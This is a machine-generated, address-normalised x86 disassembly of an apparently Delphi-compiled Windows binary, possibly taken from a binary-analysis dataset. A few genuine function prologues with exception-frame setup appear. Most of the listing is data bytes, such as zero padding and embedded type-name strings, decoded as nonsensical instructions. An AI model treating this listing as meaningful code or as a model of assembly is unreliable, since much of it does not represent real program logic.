cmp ebx 0xfe000000
jne r-xdata
mov ebx ecx
and ebx 0xffffff
add ebx eax
mov eax ebx
mov edx esi
call sub_4057a4
jmp r-xdata
mov [ esp ] ecx
mov ebx [ eax ]
movsx ecx cx
add ebx ecx
mov ecx [ ebx ]
mov [ esp ] ecx
jmp r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov ecx esi
mov edx eax
mov eax [ esp + 0x4 ]
call [ esp ]
mov edx esi
mov eax [ esp + 0x4 ]
call [ esp ]
jmp r-xdata
mov [ esp + 0x4 ] eax
mov eax [ edx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
sub_415528
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_41556e
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415575
retn
mov eax rw-data
call sub_403f20
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_40499c
sub_415580
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4155a5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4155ac
retn
sub_4155b8
mov esp 0x3004155
or dl [ ecx + eax * 2 + 0x6c ]
imul esp [ edi + 0x6e ] 0x746e656d
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + 0xd004155 ] bh
je r-xdata
add [ gs : eax ] eax
dec esp
je r-xdata
add [ eax ] eax
add [ eax ] al
add [ esi ] al
outsd
push edx
jae r-xdata
jne r-xdata
or al 0x57
inc ecx
push 0x5746669
jae r-xdata
sbb [ edx + 0x64 ] ah
push edx
bound esp [ edx + edx * 2 + 0x69 ]
push 0x4c6f5474
je r-xdata
retn
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ esi + edx * 2 ] ch
inc ecx
inc eax
add [ eax ] dh
push esi
inc ecx
add [ ebx ] al
or [ edx + eax * 2 + 0x69 ] edx
inc esp
imul ecx [ ebp + 0x6f ] 0x16564
imul esp [ edi + 0x68 ] 0x64620d74
je r-xdata
popad
jae r-xdata
outsd
outsb
je r-xdata
push esp
jns r-xdata
inc ecx
insb
je r-xdata
insb
or [ gs : ebx + 0x73 ] dh
popad
imul ebp [ fs : esi + 0x67 ] 0x796c6e4f
pop es
jae r-xdata
imul esp [ edi + 0x68 ] 0x4c6f5474
outsd
dec esp
je r-xdata
jns r-xdata
xor eax [ eax ]
in al 0x33
inc eax
add al ch
xor eax [ eax ]
in al dx
jae r-xdata
je r-xdata
js r-xdata
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ gs : eax ] eax
push es
jae r-xdata
jae r-xdata
outsd
insb
pop es
inc ebx
insb
popad
jae r-xdata
add [ ecx ] al
or al 0x54
dec eax
insb
jo r-xdata
jae r-xdata
mov eax eax
je r-xdata
or [ ecx + 0x43 ] dh
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x58 ] cl
inc ecx
add [ eax + eax ] cl
add [ eax ] al
mov al [ 0xffffffffd8004157 ]
xor eax [ eax ]
in al 0x33
inc eax
add al ch
xor eax [ eax ]
in al dx
xor eax [ eax ]
loopne r-xdata
inc eax
add [ eax ] al
add ah ch
push edi
inc ecx
add [ ecx ] al
or [ ebx + edx * 2 + 0x68 ] edx
outsd
jb r-xdata
xor [ ecx ] 0x40
add [ eax * 2 + 0x65727453 ] cl
popad
jns r-xdata
jb r-xdata
add al 0x1
add [ eax ] al
cmp bh 0xff
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
inc ecx
add [ ecx ] cl
push 0x79654b74
ja r-xdata
and al 0x57
dec esp
je r-xdata
add [ eax ] al
inc ebx
push edi
inc ecx
add [ eax + eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ eax + 0x74 ] ebp
inc ebx
outsd
outsb
add [ ecx ] ecx
push esp
push ebx
push 0x4374726f
jae r-xdata
jae r-xdata
add [ eax ] al
add [ esi + edx * 2 + 0x73070041 ] bl
jae r-xdata
shl [ eax + 0x3004156 ] 0x2
xor [ cs : ecx ] eax
add [ ecx ] al
add [ eax ] al
add [ edi + edx * 2 ] ah
insb
je r-xdata
outsd
dec esp
jb r-xdata
add [ 0x654c6462 ] cl
je r-xdata
push edx
imul esp [ edi + 0x68 ] 0x73754a74
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc004158 ] ch
add [ eax ] al
add ah bh
push edi
inc ecx
add al bl
xor eax [ eax ]
in al 0x33
inc eax
add al ch
xor eax [ eax ]
in al dx
xor eax [ eax ]
loopne r-xdata
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
xor [ ecx ] 0x40
add [ eax ] dl
add [ eax ] al
add [ eax ] al
outsd
jb r-xdata
loopne r-xdata
jne r-xdata
inc ebx
xor eax [ eax ]
add [ eax + esi * 2 + 0x33d80040 ] cl
inc eax
add ah ah
xor eax [ eax ]
call 0xffffffffec41980c
jbe r-xdata
add [ ecx + edx ] al
inc eax
add [ ebp + 0x57ec0040 ] cl
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x4 ] si
adc [ eax ] eax
lea eax [ eax ]
in al dx
push edi
inc esp
outsd
jne r-xdata
or [ ebx + 0x73 ] dh
jae r-xdata
js r-xdata
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
add eax [ eax ]
add [ eax ] al
add bh bh
inc [ eax ]
add [ eax + 0x57 ] bh
inc ecx
add [ eax ] cl
or al 0x54
dec esi
outsd
je r-xdata
hlt
dec edi
outsb
insb
jns r-xdata
jae r-xdata
nop
inc ebx
insb
popad
jae r-xdata
push edx
imul esp [ edi + 0x68 ] 0x4c6f5474
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebx * 2 ] al
inc ecx
add [ eax + eax ] cl
add [ eax ] al
cld
push edi
inc ecx
add al bl
xor eax [ eax ]
in al 0x33
inc eax
add al ch
xor eax [ eax ]
in al dx
xor eax [ eax ]
loopne r-xdata
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
xor [ ecx ] 0x40
add [ 0x72434645 ] cl
popad
je r-xdata
add [ eax ] al
add [ eax ] al
outsd
jb r-xdata
add [ eax ] ecx
push es
push ebx
outsb
jb r-xdata
inc eax
add [ eax + 0x58 ] cl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor [ eax ] eax
or al 0x45
outsb
je r-xdata
dec ebx
jns r-xdata
dec ebp
imul esp [ esp + 0x6c ] 0x73730865
push edx
imul esp [ edi + 0x68 ] 0x73730874
pop es
inc ebx
insb
jae r-xdata
je r-xdata
outsd
dec esp
add [ eax ] al
add [ eax ] al
push es
mov eax eax
mov al [ 0x3004156 ]
add ch [ esi ]
xor [ ecx ] eax
inc ebx
insb
popad
jae r-xdata
je r-xdata
imul esp [ edi + 0x68 ] 0x174
add [ eax ] al
add [ eax ] eax
add [ eax ] al
mov eax 0x7004155
inc ebx
insb
popad
jae r-xdata
inc ecx
insb
imul esp [ edi + 0x6e ] 0x52646218
jae r-xdata
pop es
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebx * 2 + 0x41 ] bl
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
xor [ ecx ] 0x40
add [ ebx ] cl
inc ebp
inc esi
dec edi
jo r-xdata
add [ eax + eax ] cl
add [ eax ] al
mov al [ 0xffffffffd8004157 ]
xor eax [ eax ]
in al 0x33
inc eax
add al ch
xor eax [ eax ]
in al dx
xor eax [ eax ]
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
jb r-xdata
push ebx
je r-xdata
add [ eax + 0xc004031 ] al
inc ebp
inc eax
add [ eax + 0x4158 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insd
inc ebp
jb r-xdata
popad
add [ eax ] al
in al dx
je r-xdata
push 0x6e6f4374
call 0xffffffffc07455e0
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4155ac
retn
or [ esi + 0x41 ] dl
add [ ebx ] al
or dl [ esp + ecx * 2 + 0x65 ]
je r-xdata
or eax 0x69526462
push 0x4c6f5474
outsb
je r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebx * 2 + 0xc0041 ] dh
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
xor [ ecx ] 0x40
add [ ebx ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop esp
pop ecx
inc ecx
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ebx * 2 ] cl
inc ecx
add [ eax + eax ] cl
add [ eax ] al
adc [ ecx + 0x41 ] bl
add al bl
xor eax [ eax ]
in al 0x33
inc eax
add al ch
xor eax [ eax ]
in al dx
xor eax [ eax ]
loopne r-xdata
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
xor [ ecx ] 0x40
add [ edx ] cl
inc ebp
push edx
popad
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop ecx
inc ecx
add [ eax ] al
add [ eax ] al
adc [ ecx + 0x41 ] bl
add al bl
xor eax [ eax ]
in al 0x33
inc eax
add al ch
xor eax [ eax ]
in al dx
xor eax [ eax ]
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov ah 0x59
inc ecx
add [ eax + eax ] cl
outsd
jb r-xdata
inc ebp
inc esi
imul ebp [ ebp + 0x53 ] 0x61657274
insd
inc ebp
jb r-xdata
inc eax
add [ eax + 0x10004031 ] al
rol [ ecx + ebx * 2 ] 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ebx * 2 + 0x41 ] ah
add [ eax + eax ] cl
add [ eax ] al
adc [ ecx + 0x41 ] bl
add al bl
xor eax [ eax ]
in al 0x33
inc eax
add al ch
xor eax [ eax ]
in al dx
xor eax [ eax ]
loopne r-xdata
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
xor [ ecx ] 0x40
add [ ebx ] cl
inc ebp
push edi
jb r-xdata
add [ eax ] al
outsd
jb r-xdata
add [ eax ] al
pop ecx
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
pop edx
inc ecx
add [ eax + eax ] cl
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
xor [ ecx ] 0x40
add [ esi ] cl
inc ebp
inc ebx
insb
popad
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
inc ebp
inc esi
imul ebp [ ebp + 0x72 ] 0x6f727245
jb r-xdata
sub [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] al
add [ eax + 0xb004031 ] al
or al 0x5a
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec esi
outsd
je r-xdata
add [ eax ] al
inc ebp
jb r-xdata
xor [ eax ] eax
outsd
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rcr [ edx + 0x41 ] 0x0
or al 0x0
outsd
jb r-xdata
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
xor [ ecx ] 0x40
add [ edx ] cl
inc ebp
dec esp
imul esi [ ebx + 0x74 ] 0x6f727245
jb r-xdata
outsd
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb al 0x5b
nop
rcr [ edx + 0x41 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop edx
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
xor [ eax ] eax
xor [ ecx ] 0x40
add [ eax * 2 + 0x4e736552 ] cl
outsd
je r-xdata
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
inc ecx
add [ eax + eax ] cl
add [ eax ] al
lea eax [ eax ]
sbb al 0x5b
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ebx * 2 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah cl
pop ebx
inc ecx
add [ eax + eax ] cl
add [ eax ] al
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ebx * 2 + 0x41 ] dh
add [ eax ] al
add [ eax + esi * 2 + 0x33d80040 ] cl
inc eax
add ah ah
xor eax [ eax ]
call 0xffffffffec419bec
xor eax [ eax ]
loopne r-xdata
add [ eax + eax ] cl
add [ eax ] al
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebx * 2 ] ch
inc ecx
add [ eax + eax ] cl
add [ eax ] al
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
xor [ ecx ] 0x40
add [ eax ] dl
inc ebp
push ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
imul ebp [ esi + 0x67 ] 0x7473694c
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ah
pop esp
inc ecx
add [ eax + eax ] cl
add [ eax ] al
inc eax
add [ eax ] ch
xor [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1000415c ] cl
add [ eax ] al
add [ eax + 0x71 ] dl
inc eax
add al bl
xor eax [ eax ]
in al 0x33
inc eax
add al ch
xor eax [ eax ]
in al dx
xor eax [ eax ]
loopne r-xdata
outsd
jb r-xdata
add [ ecx + esi + 0x40 ] al
add [ eax + 0xa004031 ] al
inc ebp
inc edx
imul esi [ ebx + esi * 2 + 0x45 ] 0x726f7272
nop
int3
inc eax
add [ esp + ebx * 2 ] ch
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_415cc3
add al bl
xor eax [ eax ]
in al 0x33
inc eax
add al ch
xor eax [ eax ]
in al dx
xor eax [ eax ]
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + ebx * 2 + 0x41 ] dl
add [ eax ] dl
add [ eax ] al
add [ eax - 0x27ffbff0 ] dh
xor eax [ eax ]
in al 0x33
inc eax
add al ch
xor eax [ eax ]
in al dx
xor eax [ eax ]
loopne r-xdata
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
xor [ ecx ] 0x40
add [ ecx ] dl
inc ebp
dec ecx
outsb
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x2400415d ] ch
add [ eax ] al
add [ eax - 0x27ffbff0 ] dh
xor eax [ eax ]
in al 0x33
inc eax
add al ch
xor eax [ eax ]
in al dx
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
hlt
add [ eax - 0x7d ] cl
inc ecx
add ah al
add [ ecx ] 0x5
push esp
dec esp
imul esi [ ebx + 0x74 ] 0x5da8c08b
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
imul esp [ edi + ecx * 2 + 0x70 ] 0x74617265
imul ebp [ edi + 0x6e ] 0x5d44c08b
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop esi
inc ecx
add [ eax + eax ] cl
add [ eax ] al
mov al 0x10
inc eax
add al bl
xor eax [ eax ]
in al 0x33
inc eax
add al ch
xor eax [ eax ]
in al dx
xor eax [ eax ]
loopne r-xdata
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
xor [ edi + 0x540b0041 ] al
push esp
push 0x64616572
dec esp
imul esi [ ebx + 0x74 ] r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x41 ] bl
pop esi
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
movsb [ edi ] [ esi ]
mov [ ecx ] al
add eax 0x74694254
jae r-xdata
je r-xdata
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
pop eax
mov al [ ecx ]
push 0x7000418b
mov eax [ ecx ]
test [ edx + 0x20041 ] cl
xor eax [ eax ]
loopne r-xdata
inc eax
add ah ch
rcl [ esi + ebx * 2 + 0x41 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb [ esi + 0x41 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushad
inc ecx
add [ esi + 0x5e ] ch
inc ecx
add [ eax + eax ] al
add [ eax ] al
mov al 0x10
inc eax
add al bl
xor eax [ eax ]
in al 0x33
inc eax
add al ch
xor eax [ eax ]
in al dx
xor eax [ eax ]
loopne r-xdata
mov eax eax
push esp
pop esi
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x415e ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x5e ] ah
rol [ eax + 0x700415e ] 0xb
push esp
push eax
jb r-xdata
inc ecx
add ch dl
pop esi
inc ecx
add [ eax ] al
add [ eax ] al
add [ edi + ebx * 2 + 0x41 ] dl
add [ eax + 0x415f ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x5f ] ah
imul esi [ ebx + 0x74 ] 0x54746e65
pop esi
inc ecx
add [ ecx + edx ] al
inc eax
add [ eax ] al
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
outsb
je r-xdata
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
pop eax
mov al [ ecx ]
push 0x7000418b
mov eax [ ecx ]
test [ edx - 0x7347ffbf ] cl
inc ecx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx + edx ] ah
inc eax
add [ eax + eax ] al
add [ eax ] al
adc eax 0x746e4954
jb r-xdata
inc ecx
add [ eax + eax ] cl
add [ eax ] al
or [ esi + 0x41 ] bl
add al bl
xor eax [ eax ]
sub [ ecx + eax * 2 + 0x4033e800 ] cl
add ah ch
xor eax [ eax ]
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop di
jae r-xdata
add [ eax ] al
add [ eax ] cl
pop esi
inc ecx
jb r-xdata
add al bl
xor eax [ eax ]
in al 0x33
inc eax
add al ch
xor eax [ eax ]
in al dx
xor eax [ eax ]
loopne r-xdata
or [ esi + 0x41 ] bl
popad
arpl [ ebp + 0x64 ] sp
push eax
jb r-xdata
add [ ebp - 0x7c33ffc0 ] cl
inc esp
and al 0x4
clc
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0xc ]
[ edi + ecx * 4 + 0x41 ]
add [ eax + 0xf00418e ] ch
push esp
inc ebx
outsd
insb
insb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
dec ecx
je r-xdata
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
adc al 0x8e
inc ecx
add [ eax - 0x75 ] ch
inc ecx
add [ eax - 0x75 ] dh
inc ecx
add [ edx + ecx * 4 - 0x717fffbf ] al
inc ecx
add [ eax - 0x71 ] ah
inc ecx
xor eax [ eax ]
sub [ ecx ] dh
inc eax
imul esi [ ebx + 0x74 ] 0x80746e65
pop edi
inc ecx
add [ edi ] al
adc eax 0x746e4954
jb r-xdata
inc eax
add ah ch
insd
mov eax eax
cmp al 0x60
inc ecx
add [ edi ] al
andps xmm0 [ ebx + 0x6f ]
add [ ecx + esi + 0x40 ] al
add [ esi + ecx * 4 ] dl
popad
arpl [ ebp + 0x64 ] sp
push eax
jb r-xdata
xchg ecx eax
add [ eax ] al
add al 0x0
std
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
or al 0x90
inc ecx
add [ eax - 0x75 ] ch
inc ecx
add [ eax - 0x75 ] dh
mov eax [ ecx ]
jo r-xdata
insd
clc
pop edi
inc ecx
add [ esi + ebx * 2 + 0x41 ] bh
add [ eax ] al
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
add [ eax - 0x77ffbe71 ] dl
pop [ ecx ]
fmul [ ebp + 0x20041 ]
or [ esi - 0x709fffbf ] 0x41
imul esi [ ebx + 0x74 ] 0x44746e65
pop edi
inc ecx
add [ esi + ebx * 2 + 0x41 ] bh
add [ eax ] al
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
insb
insb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
dec ecx
je r-xdata
inc ecx
add [ eax - 0x70 ] bh
inc ecx
add [ esp + edx * 4 - 0x6b3fffbf ] bh
inc ecx
add ah al
xchg esp eax
inc ecx
add [ esp + edx * 4 - 0x6b47ffbf ] dh
inc ecx
add [ eax ] dl
xchg ecx eax
inc ecx
add [ ecx + edx * 4 + 0xe0041 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
xchg esp eax
adc [ eax ] al
adc al 0x0
inc ecx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x140040 ] dl
adc [ ecx - 0x6e73ffbf ] dl
jae r-xdata
jae r-xdata
xor eax [ eax ]
loopne r-xdata
add [ ebp + 0x60b00040 ] cl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
pushad
inc ecx
add [ ecx ] dl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dl ch
pushad
inc ecx
add [ ecx ] al
inc ecx
add [ eax ] bl
add [ eax ] al
add [ eax ] cl
pop esi
inc ecx
add al bl
xor eax [ eax ]
in al 0x33
inc eax
add al ch
xor eax [ eax ]
in al dx
add [ eax + r-xdata ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp al 0x60
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
pushad
inc ecx
add [ esi ] ah
pushad
inc ecx
add [ eax + eax ] cl
add [ eax ] al
sub_416280
push cs
or edx [ ebx + edx * 2 + 0x74 ]
jb r-xdata
and [ edi - 0x69e7ffbf ] dl
outsb
dec ecx
je r-xdata
add [ ecx + esi + 0x40 ] al
add [ eax - 0x2bffbfcf ] al
imul ebp [ esi + 0x67 ] 0x7473694c
xchg esp eax
arpl [ ecx ] ax
pop es
or edx [ ebx + edx * 2 + 0x74 ]
jb r-xdata
inc ecx
add ah dh
movsb [ edi ] [ esi ]
inc ecx
add [ eax ] ch
movsd [ edi ] [ esi ]
inc ecx
add [ 0xffffffffa5300041 ] ch
inc ecx
add [ edx + ebx * 4 ] al
inc ecx
add [ esi - 0x58ffffbf ] ah
xchg edi eax
inc ecx
add [ eax ] bl
xchg esi eax
insd
or [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
xchg esp eax
adc [ eax ] al
add [ eax ] al
add [ eax ] al
lea eax [ eax ]
in al dx
bound eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg esp eax
arpl [ ecx ] ax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test [ ebx + 0x41 ] ah
add [ eax ] dh
add [ eax ] al
add [ eax + 0x61 ] dh
inc ecx
add al bl
xor eax [ eax ]
in al 0x33
inc eax
add al ch
xor eax [ eax ]
in al dx
xor eax [ eax ]
loopne r-xdata
push ebx
popad
add [ eax ] ah
test eax 0xa9380041
inc ecx
add [ eax - 0x6fffbfd7 ] dl
sub [ eax ] eax
fsubr [ ecx - 0x55a3ffbf ]
inc ecx
add [ edi ] al
push esp
push ebx
je r-xdata
aam 0xa8
inc ecx
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
pop eax
bound eax [ ecx ]
add [ eax ] al
pop es
inc ebx
insb
popad
jae r-xdata
inc ecx
add ah dl
cmpsd [ esi ] [ edi ]
inc ecx
add ah al
mov al [ 0xffffffffa8100041 ]
inc ecx
add [ eax + ebp * 4 - 0x5d57ffbf ] al
inc ecx
add [ edx - 0x6a9fffbf ] dh
inc ecx
add [ eax - 0x5d ] dl
inc ecx
add [ eax - 0x3ffbe5d ] dl
mov [ 0xffffffff99b00041 ] eax
inc ecx
add [ ebp - 0x6447ffbf ] cl
inc ecx
add [ esp + ebx * 4 - 0x5a37ffbf ] cl
inc ecx
add al bl
movsd [ edi ] [ esi ]
inc ecx
add al dh
pushfd
inc ecx
add [ ebp + ebx * 4 + 0x41 ] al
add al dh
popfd
inc ecx
add [ eax - 0x1fffbe61 ] cl
lahf
inc ecx
add [ eax + 0x41 ] dh
add [ eax ] bl
mov [ 0xffffffffa3340041 ] eax
inc ecx
add [ esi ] ch
inc ecx
add [ esp + 0x41 ] bh
add [ eax + ebp * 4 ] bh
inc ecx
add [ eax + ebp * 4 + 0x41 ] cl
add [ ebx ] cl
push esp
push ebx
je r-xdata
cmpsd [ esi ] [ edi ]
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
dec esp
mov [ 0xffffffff8b680041 ] al
inc ecx
add [ eax ] ah
push ebx
je r-xdata
popad
insd
mov eax eax
in al dx
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
inc ecx
add [ eax ] cl
add [ eax ] al
add [ eax ] ch
inc ecx
add al bl
xor eax [ eax ]
in al 0x33
inc eax
add al ch
xor eax [ eax ]
in al dx
xor eax [ eax ]
loopne r-xdata
inc ecx
add [ 0x6e614854 ] cl
insb
inc ecx
jb r-xdata
jae r-xdata
insd
dec ebp
popad
insd
pushad
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0x41 ] bh
add [ eax ] dl
add [ eax ] al
add [ eax - 0x27ffbe9d ] bh
xor eax [ eax ]
in al 0x33
inc eax
